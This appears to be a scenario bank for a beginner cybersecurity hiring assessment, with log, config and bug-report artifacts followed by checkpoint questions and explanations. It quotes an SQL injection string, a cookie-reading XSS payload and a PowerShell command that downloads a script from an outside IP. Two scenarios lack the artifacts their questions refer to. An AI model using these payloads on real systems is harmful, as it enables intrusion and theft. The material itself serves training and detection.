meta.name: GetHired Practical Assessment — Scenario Bank
meta.note: Static, checkpoint/flag-style scenarios. Fully rule-based grading — no AI. Answers are normalized (lowercase, trimmed, punctuation-stripped) before comparison against acceptedAnswers.
meta.design_notes: Format informed by research into TryHackMe/HackTheBox/LetsDefend/CyberDefenders beginner content: one static artifact per scenario, 2-3 sequential checkpoint questions mirroring an analyst's investigation order, exact-match grading with a synonym list per answer, uniform point value per checkpoint (no partial credit, no hints in v1).

scenarios.title: SSH Brute-Force Sweep
scenarios.scenario: You're reviewing authentication logs on a public-facing web server after a monitoring rule flagged unusual SSH activity overnight.
scenarios.artifact:
Aug 01 02:14:03 web01 sshd[1122]: Failed password for invalid user admin from 198.51.100.23 port 51422 ssh2
Aug 01 02:14:05 web01 sshd[1122]: Failed password for invalid user admin from 198.51.100.23 port 51423 ssh2
Aug 01 02:14:07 web01 sshd[1122]: Failed password for invalid user root from 198.51.100.23 port 51424 ssh2
Aug 01 02:14:09 web01 sshd[1122]: Failed password for invalid user root from 198.51.100.23 port 51425 ssh2
Aug 01 02:14:11 web01 sshd[1122]: Failed password for invalid user oracle from 198.51.100.23 port 51426 ssh2
Aug 01 02:14:14 web01 sshd[1131]: Accepted password for oracle from 198.51.100.23 port 51430 ssh2
Aug 01 02:14:15 web01 sshd[1131]: pam_unix(sshd:session): session opened for user oracle by (uid=0)

checkpoints.question: What source IP address appears on every line of this log excerpt?
checkpoints.explanation: Every attempt — failed and successful — comes from 198.51.100.23, which is why it's the first thing to pivot on when investigating.

checkpoints.question: Which username did the attacker ultimately authenticate as successfully?
checkpoints.explanation: After failing on 'admin' and 'root', the attacker succeeded on the third username tried, 'oracle' — a reminder that service accounts are often weaker targets than obviously-privileged ones.

checkpoints.question: Many failed logins with different usernames from one IP, followed by a success, is a classic sign of what kind of attack?
checkpoints.explanation: This is textbook brute-forcing: automated, rapid-fire login attempts until one combination works. It's exactly the pattern SIEM correlation rules are built to catch.

scenarios.title: Anomalous Web Request
scenarios.scenario: You're scanning a web server's access log after a WAF dashboard showed a spike in response size for one endpoint.

checkpoints.question: Which IP address sent the request that appears to be attempting SQL injection?
checkpoints.explanation: 203.0.113.44 sent both the normal /product requests and the ' OR '1'='1 payload — the same client, escalating from normal browsing to an injection attempt.

checkpoints.question: What HTTP status code did the server return for the ' OR '1'='1 request (the one with the unusually large 5120-byte response)?
checkpoints.explanation: A 200 with a much larger response body than the normal ~1200 bytes strongly suggests the injected query executed and returned extra data — a 200 here is more alarming than the later 500 error, which is just the database rejecting broken syntax.

scenarios.title: Unusual Connection Pattern
scenarios.scenario: A NIDS sensor logged a burst of TCP connection attempts from an internal host to another internal host across many ports within the same second.
scenarios.artifact:
Source: 192.168.10.55
Destination: 10.0.0.20
15:02:01  SYN -> port 21    (no response)
15:02:01  SYN -> port 22    (no response)
15:02:01  SYN -> port 23    (no response)
15:02:01  SYN -> port 80    RST/ACK
15:02:01  SYN -> port 443   RST/ACK
15:02:01  SYN -> port 3389  (no response)
15:02:01  SYN -> port 8080  (no response)

checkpoints.question: What single source IP is generating all of these connection attempts?
checkpoints.explanation: 192.168.10.55 is hitting seven different ports on the same destination within the same second — the source to isolate and investigate first.

checkpoints.question: One host sending SYN packets to many different ports on another host in rapid succession is best described as what?
checkpoints.explanation: This is the signature shape of a port scan: many SYNs, few or no completed handshakes, spread across a range of ports rather than one.

checkpoints.question: How many of the 7 scanned ports actually returned a response (RST/ACK) instead of staying silent?
checkpoints.explanation: Ports 80 and 443 replied with RST/ACK — meaning the host is up and those two ports are closed-but-reachable, while the silent ports are likely filtered by a firewall.

scenarios.title: Subnet Math
scenarios.scenario: You're documenting network segments for an asset inventory and need to work out the details of this interface from its configuration.
scenarios.artifact:
Interface: eth0
IP Address: 192.168.1.130
Subnet Mask: 255.255.255.192

checkpoints.question: What is the CIDR notation (/xx) equivalent of the subnet mask 255.255.255.192?
What is the network address for this host's subnet?
checkpoints.explanation: A /26 breaks the last octet into blocks of 64. 192.168.1.130 falls in the 128-191 block, so the network address is 192.168.1.128.

checkpoints.question: How many usable host addresses are available in this /26 subnet?
checkpoints.explanation: A /26 has 64 total addresses; subtract 2 for the network and broadcast addresses, leaving 62 usable host addresses.

scenarios.title: Unsafe Query Construction
scenarios.scenario: You're doing a quick code review on a pull request for an internal admin tool ahead of a security sign-off.

checkpoints.question: What OWASP Top 10 vulnerability class does this code contain?
checkpoints.explanation: Concatenating raw user input directly into a SQL string lets an attacker supply input like ' OR '1'='1 to change the query's logic — classic SQL injection.

checkpoints.question: What should replace string concatenation here to fix the vulnerability?
checkpoints.explanation: Parameterized queries (prepared statements) send user input separately from the query structure, so the database never interprets it as SQL — the standard fix for injection.

scenarios.title: Leaked Configuration File
scenarios.scenario: A teammate accidentally pushed an environment file to a public GitHub repository. You've been asked to flag what's wrong before it's force-removed from history.
scenarios.artifact:
# config.env (committed to public repo)
DB_HOST=prod-db.internal
DB_USER=admin
DB_PASSWORD=Summer2024!
API_KEY=sk_live_51Hc8...
DEBUG=True

checkpoints.question: What security issue applies to both DB_PASSWORD and API_KEY in this file?
checkpoints.explanation: Real production credentials committed directly into a file, now in a public repo's history, are hardcoded secrets — they must be rotated immediately, not just deleted from the latest commit.

checkpoints.question: Besides the exposed secrets, what other setting in this file is risky to leave enabled in a production environment?
checkpoints.explanation: DEBUG=True in production frameworks often leaks stack traces, internal file paths, and configuration details to anyone who can trigger an error page.

scenarios.title: Order Lookup Flaw
scenarios.scenario: A bug bounty report comes in: a logged-in user changed the order_id number in the URL and was able to view another customer's full order, including their address and payment last-4 digits — with no error or permission check.
scenarios.artifact:
Steps to reproduce:
1. Log in as a normal customer.
2. Open your own order: /orders/1042
3. Change the URL to /orders/1043 (someone else's order ID).
4. Observe: the other customer's order details load normally, with no access-denied response.

checkpoints.question: Which OWASP Top 10 (2021) category best describes this flaw?
checkpoints.explanation: This is Broken Access Control (OWASP A01:2021) — specifically an Insecure Direct Object Reference (IDOR): the app trusts the order_id from the URL without checking it belongs to the requesting user.

scenarios.title: Reflected Input on a Login Page
scenarios.scenario: A tester notices that a site's login form echoes back whatever is typed into the username field when login fails, without any encoding.
scenarios.artifact:
Input submitted as username: <script>alert(document.cookie)</script>
Resulting page: the login error message renders the input directly into the HTML, and the script executes in the browser — a popup showing the page's cookies appears.

checkpoints.question: Which OWASP Top 10 category does this describe?
checkpoints.explanation: Rendering unescaped user input back into a page so a script executes in another user's browser is Cross-Site Scripting (XSS), grouped under OWASP's broader Injection category (A03:2021).

checkpoints.question: What is the common three-letter abbreviation for this vulnerability class?
checkpoints.explanation: XSS — Cross-Site Scripting.

scenarios.title: Impossible Travel Alert
scenarios.scenario: Your SIEM fires an 'impossible travel' rule: the same user account logged in from two geographically distant locations too close together in time to be physically possible.
scenarios.artifact:
Alert: Impossible Travel
User: j.smith@company.com
Event 1: Login from Chennai, India at 09:02 UTC
Event 2: Login from Frankfurt, Germany at 09:14 UTC
HR note: j.smith is on approved leave this week.
Immediately after Event 2, a bulk export of the customer database (14,000 records) was initiated from that session.

checkpoints.question: Is this alert a true positive or a false positive?
checkpoints.explanation: The user is confirmed on leave (so it's not them working from a new location), and the session was used to bulk-export sensitive data — every corroborating detail points to a compromised account, not a benign explanation.

checkpoints.question: What should the analyst's next action be?
checkpoints.explanation: With account compromise plus active data exfiltration, this needs immediate escalation/containment (disable the account, force a password reset, involve the IR team) — not a routine close.

scenarios.title: Suspicious Macro Execution
scenarios.scenario: Endpoint AV quarantined a file on a new hire's laptop, but the process tree shows the malicious action had already started before quarantine kicked in.
scenarios.artifact:
Alert: Antivirus Detection
Host: FIN-LAPTOP-04
File: quarterly_report_invoice.xlsm
Action taken by AV: Quarantined
User: finance-intern (new hire, started 3 days ago)
Process tree: EXCEL.EXE -> powershell.exe -c "iwr http://45.9.x.x/update.ps1"

checkpoints.question: Based on the file extension, what type of malicious payload likely delivered this attack?
checkpoints.explanation: .xlsm files support embedded macros — a very common initial-access technique, especially against new employees unfamiliar with 'enable content' warnings.

checkpoints.question: What command-line tool did the macro spawn to reach out to the internet?
checkpoints.explanation: EXCEL.EXE spawning powershell.exe is a well-known red flag — Office applications legitimately have no reason to launch a shell.

checkpoints.question: Given the process tree shows the download command already ran, should this alert be closed once the file is quarantined, or escalated for further investigation?
checkpoints.explanation: Quarantining the original file doesn't undo commands that already executed — the host needs to be investigated for what update.ps1 actually did before this can be closed.
